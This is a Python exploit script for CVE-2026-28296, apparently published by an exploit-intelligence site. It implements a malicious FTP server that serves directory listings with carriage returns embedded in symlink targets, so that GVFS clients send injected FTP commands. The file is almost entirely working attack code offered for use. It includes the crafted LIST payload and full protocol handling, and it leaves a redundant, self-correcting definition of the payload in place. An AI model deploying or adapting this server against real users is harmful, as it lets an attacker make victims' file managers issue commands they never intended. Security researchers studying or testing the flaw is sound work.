#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : GVFS FTP CRLF Injection - Malicious FTP Server
#                  (crafted LIST with tainted symlink targets)
# CVE            : CVE-2026-28296
# Vendor         : GNOME
# Product        : GVFS (gvfs)
# Type           : CWE-93 - CRLF Injection
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-26
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-28296 Fix Bypass - Malicious FTP Server
=================================================

Raw-socket FTP server that serves crafted LIST responses with embedded
\\r characters in symlink targets. This demonstrates that the GVFS CRLF
fix (commit 21dda190) only validates g_vfs_ftp_file_new_from_gvfs()
(user-supplied paths) but leaves g_vfs_ftp_file_new_from_ftp()
(server-supplied paths via LIST/symlinks) completely unvalidated.

When GVFS resolves a symlink from a LIST response, the tainted target
flows through g_vfs_ftp_dir_cache_funcs_resolve_default() into
g_vfs_ftp_file_new_from_ftp() and then into FTP commands like:
    CWD %s  (gvfsftpdircache.c:512)
    SIZE %s (gvfsftpdircache.c:531)

The embedded \\r terminates the intended command and the bytes after it
become a new FTP command from the server's perspective.
"""

import socket
import threading
import time
import json
import os
import sys
import signal

# --- Configuration ---
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 21
PASV_HOST = os.environ.get("PASV_ADDRESS", "172.28.0.11")
PASV_PORT_MIN = 31000
PASV_PORT_MAX = 31009

FTP_USER = "ftpuser"
FTP_PASS = "ftpuser"

LOG_FILE = "/tmp/ftp_commands.log"

# --- Crafted directory listing ---
# The key payload: a symlink whose target contains an embedded \r
# Wire format of the LIST line:
#   lrwxrwxrwx 1 user user   22 Jan  1 00:00 evillink -> /tmp\rSTAT\r\n
#
# GVFS parsing (gvfsftpdircache.c:660-670):
#   - g_data_input_stream_read_line() reads up to \n (LF)
#   - Line 670: strips trailing \r (the one before \n)
#   - Result: "...evillink -> /tmp\rSTAT"
#   - ParseFTPList extracts symlink target: "/tmp\rSTAT"
#   - The embedded \r in the MIDDLE survives
#
# When GVFS resolves this symlink (line 850):
#   g_vfs_ftp_file_new_from_ftp(backend, "/tmp\rSTAT")
# Then uses it in CWD/SIZE:
#   "CWD /tmp\rSTAT\r\n"  ->  server sees "CWD /tmp" + "STAT"

# Normal file entry
LIST_ENTRY_README = (
    "-rw-r--r-- 1 user user   22 Jan  1 00:00 readme.txt\r\n"
)

# Symlink with embedded \r in target
# Target: /tmp\rSTAT  (the \r after /tmp is the injection point)
LIST_ENTRY_EVILLINK = (
    "lrwxrwxrwx 1 user user   22 Jan  1 00:00 evillink -> "
    "/tmp\rSTAT\r\r\n"
)
# The wire bytes are: ...evillink -> /tmp<CR>STAT<CR><CR><LF>
# After GVFS strips trailing <CR> before <LF>: ...evillink -> /tmp<CR>STAT<CR>
# After GVFS strips the NEW trailing <CR>: ...evillink -> /tmp<CR>STAT
# Wait - GVFS only strips ONE trailing \r (line 670).
# So the result after strip: ...evillink -> /tmp<CR>STAT<CR>
# ParseFTPList should handle the symlink target extraction.
# Let's use the exact format from the plan: the trailing \r is stripped,
# the embedded \r survives.

# Corrected: just use \r\n at the end (standard line ending).
# The symlink target itself contains \r which is the payload.
LIST_ENTRY_EVILLINK = (
    "lrwxrwxrwx 1 user user   22 Jan  1 00:00 evillink -> "
    + "/tmp\rSTAT\r"  # target with embedded \r, plus trailing \r
    + "\n"             # \n terminates the line for g_data_input_stream_read_line
)
# Wire: ...-> /tmp<0d>STAT<0d><0a>
# GVFS reads up to <0a>, gets: "...-> /tmp<0d>STAT<0d>"
# Strips trailing <0d>: "...-> /tmp<0d>STAT"
# ParseFTPList extracts target: "/tmp<0d>STAT"
# Embedded <0d> survives -> injection!

# Root directory listing
LIST_ENTRY_PUB = (
    "drwxr-xr-x 2 user user 4096 Jan  1 00:00 pub\r\n"
)

# File content for readme.txt
README_CONTENT = b"This is a test file on the malicious FTP server.\n"


def log_command(client_addr, command):
    """Log received FTP command to JSON lines file."""
    entry = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "client": f"{client_addr[0]}:{client_addr[1]}",
        "command": command,
    }
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass
    print(f"[{entry['timestamp']}] {entry['client']} >> {command!r}", flush=True)


class FTPSession(threading.Thread):
    """Handle a single FTP client session."""

    def __init__(self, conn, addr):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.authenticated = False
        self.username = None
        self.cwd = "/"
        self.transfer_type = "A"
        self.pasv_socket = None
        self.running = True

    def send(self, msg):
        """Send an FTP response line."""
        if not msg.endswith("\r\n"):
            msg += "\r\n"
        try:
            self.conn.sendall(msg.encode())
        except (BrokenPipeError, ConnectionResetError):
            self.running = False

    def recv_line(self):
        """Receive a single FTP command line."""
        buf = b""
        while self.running:
            try:
                chunk = self.conn.recv(1)
                if not chunk:
                    self.running = False
                    return None
                buf += chunk
                if buf.endswith(b"\n"):
                    line = buf.decode(errors="replace").rstrip("\r\n")
                    return line
            except (ConnectionResetError, OSError):
                self.running = False
                return None
        return None

    def open_pasv(self):
        """Open a PASV data connection listener."""
        if self.pasv_socket:
            try:
                self.pasv_socket.close()
            except Exception:
                pass

        for port in range(PASV_PORT_MIN, PASV_PORT_MAX + 1):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(("0.0.0.0", port))
                s.listen(1)
                s.settimeout(30)
                self.pasv_socket = s
                return port
            except OSError:
                continue
        return None

    def get_list_data(self, path):
        """Return LIST response bytes for a given directory."""
        # Normalize path
        if path in ("/", ""):
            return (LIST_ENTRY_PUB).encode()
        elif path.rstrip("/") in ("/pub", "pub"):
            return (LIST_ENTRY_README + LIST_ENTRY_EVILLINK).encode()
        else:
            return b""

    def run(self):
        """Main FTP session loop."""
        self.send("220 Malicious FTP Server (CVE-2026-28296 bypass lab)")

        while self.running:
            line = self.recv_line()
            if line is None:
                break

            log_command(self.addr, line)

            # Parse command and argument
            parts = line.split(" ", 1)
            cmd = parts[0].upper()
            arg = parts[1] if len(parts) > 1 else ""

            if cmd == "USER":
                self.username = arg
                self.send(f"331 Password required for {arg}")

            elif cmd == "PASS":
                if self.username == FTP_USER and arg == FTP_PASS:
                    self.authenticated = True
                    self.send("230 Login successful")
                else:
                    self.send("530 Login incorrect")

            elif cmd == "SYST":
                self.send("215 UNIX Type: L8")

            elif cmd == "FEAT":
                self.send("211-Features:")
                self.send(" PASV")
                self.send(" UTF8")
                self.send(" SIZE")
                self.send("211 End")

            elif cmd == "PWD" or cmd == "XPWD":
                self.send(f'257 "{self.cwd}" is the current directory')

            elif cmd == "TYPE":
                self.transfer_type = arg.upper() if arg else "A"
                self.send(f"200 Type set to {self.transfer_type}")

            elif cmd == "CWD" or cmd == "XCWD":
                if not self.authenticated:
                    self.send("530 Not logged in")
                    continue
                # Accept any CWD
                if arg.startswith("/"):
                    self.cwd = arg
                else:
                    self.cwd = self.cwd.rstrip("/") + "/" + arg
                self.send(f"250 Directory changed to {self.cwd}")

            elif cmd == "CDUP" or cmd == "XCUP":
                if "/" in self.cwd.rstrip("/"):
                    self.cwd = self.cwd.rstrip("/").rsplit("/", 1)[0] or "/"
                self.send("250 Directory changed")

            elif cmd == "PASV":
                port = self.open_pasv()
                if port is None:
                    self.send("425 Cannot open passive connection")
                    continue
                # Format: h1,h2,h3,h4,p1,p2
                h = PASV_HOST.replace(".", ",")
                p1 = port // 256
                p2 = port % 256
                self.send(f"227 Entering Passive Mode ({h},{p1},{p2})")

            elif cmd == "EPSV":
                port = self.open_pasv()
                if port is None:
                    self.send("425 Cannot open passive connection")
                    continue
                self.send(f"229 Entering Extended Passive Mode (|||{port}|)")

            elif cmd == "LIST":
                if not self.authenticated:
                    self.send("530 Not logged in")
                    continue

                list_path = arg if arg and not arg.startswith("-") else self.cwd
                data = self.get_list_data(list_path)

                if self.pasv_socket is None:
                    self.send("425 Use PASV first")
                    continue

                self.send("150 Opening data connection for LIST")
                try:
                    data_conn, _ = self.pasv_socket.accept()
                    data_conn.sendall(data)
                    data_conn.close()
                except Exception as e:
                    print(f"[!] Data connection error: {e}", flush=True)
                finally:
                    self.pasv_socket.close()
                    self.pasv_socket = None
                self.send("226 Transfer complete")

            elif cmd == "RETR":
                if not self.authenticated:
                    self.send("530 Not logged in")
                    continue

                # Serve readme.txt content for any RETR
                if "readme.txt" in arg:
                    if self.pasv_socket is None:
                        self.send("425 Use PASV first")
                        continue
                    self.send("150 Opening data connection")
                    try:
                        data_conn, _ = self.pasv_socket.accept()
                        data_conn.sendall(README_CONTENT)
                        data_conn.close()
                    except Exception as e:
                        print(f"[!] Data connection error: {e}", flush=True)
                    finally:
                        self.pasv_socket.close()
                        self.pasv_socket = None
                    self.send("226 Transfer complete")
                else:
                    self.send("550 File not found")

            elif cmd == "SIZE":
                if not self.authenticated:
                    self.send("530 Not logged in")
                    continue
                if "readme.txt" in arg:
                    self.send(f"213 {len(README_CONTENT)}")
                else:
                    self.send("550 File not found")

            elif cmd == "STAT":
                self.send("211-Server status:")
                self.send(f" Connected to {self.addr[0]}")
                self.send(f" Current directory: {self.cwd}")
                self.send(f" TYPE: {self.transfer_type}")
                self.send("211 End of status")

            elif cmd == "DELE":
                log_command(self.addr, f"[INJECTED] DELE {arg}")
                self.send(f"250 File {arg} deleted")

            elif cmd == "QUIT":
                self.send("221 Goodbye")
                break

            elif cmd == "OPTS":
                if "UTF8" in arg.upper():
                    self.send("200 UTF8 set to on")
                else:
                    self.send("501 Unknown option")

            elif cmd == "MLST" or cmd == "MLSD":
                self.send("502 Command not implemented")

            elif cmd == "NOOP":
                self.send("200 OK")

            elif cmd == "ABOR":
                self.send("226 Abort successful")

            else:
                self.send(f"500 Unknown command: {cmd}")

        try:
            self.conn.close()
        except Exception:
            pass
        if self.pasv_socket:
            try:
                self.pasv_socket.close()
            except Exception:
                pass
        print(f"[-] Session ended: {self.addr[0]}:{self.addr[1]}", flush=True)


def main():
    # Clear log file on start
    with open(LOG_FILE, "w") as f:
        pass

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)

    print(f"[*] Malicious FTP server listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] PASV address: {PASV_HOST}, ports {PASV_PORT_MIN}-{PASV_PORT_MAX}")
    print(f"[*] Logging commands to {LOG_FILE}")
    print(f"[*] Crafted symlink target: /tmp\\rSTAT")
    print(flush=True)

    def handle_signal(sig, frame):
        print("\n[*] Shutting down...", flush=True)
        server.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    while True:
        try:
            conn, addr = server.accept()
            print(f"[+] New connection from {addr[0]}:{addr[1]}", flush=True)
            session = FTPSession(conn, addr)
            session.start()
        except OSError:
            break


if __name__ == "__main__":
    main()
